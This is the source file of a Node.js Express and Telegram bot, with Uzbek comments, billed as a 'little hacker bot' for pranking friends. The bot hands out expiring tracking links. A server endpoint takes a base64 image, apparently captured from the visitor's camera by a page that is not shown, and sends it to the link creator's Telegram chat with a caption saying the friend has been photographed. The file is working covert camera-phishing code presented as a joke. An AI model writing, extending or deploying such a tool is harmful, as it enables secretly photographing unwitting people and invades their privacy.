require('dotenv').config();
const { Telegraf } = require('telegraf');
const express = require('express');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');

const app = express();
const bot = new Telegraf(process.env.BOT_TOKEN);

// Renderda port avtomat beriladi yoki 3000 olinadi
const PORT = process.env.PORT || 3000;
const URL = process.env.BASE_URL;

app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));

const activeLinks = new Map();

// 1. Bot Start
bot.start((ctx) => {
    ctx.reply("🕵️‍♂️ Kichik haker botga xush kelibsiz!\n\nDo'stingizni prank qilish uchun /create buyrug'ini bosing.");
});

// 2. Havola yaratish
bot.command('create', (ctx) => {
    const id = uuidv4();
    const expiresAt = Date.now() + 24 * 60 * 60 * 1000; // 24 soat

    activeLinks.set(id, {
        chatId: ctx.chat.id,
        expiresAt: expiresAt
    });

    const link = `${URL}/prank.html?id=${id}`;
    ctx.reply(`🃏 Sizning prank havolangiz tayyor:\n\n${link}\n\n⚠️ Eslatma: Havola 24 soatdan keyin o'chadi.`);
});

// 3. Rasmni qabul qilish
app.post('/upload', (req, res) => {
    const { id, image } = req.body;
    const data = activeLinks.get(id);

    if (!data || Date.now() > data.expiresAt) {
        return res.status(403).send("Havola muddati tugagan.");
    }

    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const fileName = `photo_${id}.png`;
    const filePath = path.join(__dirname, fileName);
    
    fs.writeFile(filePath, base64Data, 'base64', (err) => {
        if (!err) {
            bot.telegram.sendPhoto(data.chatId, { source: filePath }, { 
                caption: "📸 Do'stingiz rasmga olindi! Prank muvaffaqiyatli yakunlandi." 
            }).then(() => {
                // Rasmni yuborgandan so'ng serverdan o'chirish
                if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
            });
            res.send({ success: true });
        } else {
            res.status(500).send("Xatolik.");
        }
    });
});

// Botni ishga tushirish (Render uchun Webhook ishlatish tavsiya etiladi, lekin Polling ham ishlaydi)
bot.launch();

app.listen(PORT, () => {
    console.log(`Server ${PORT}-portda ishlamoqda...`);
});

// Xavfsiz to'xtatish
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));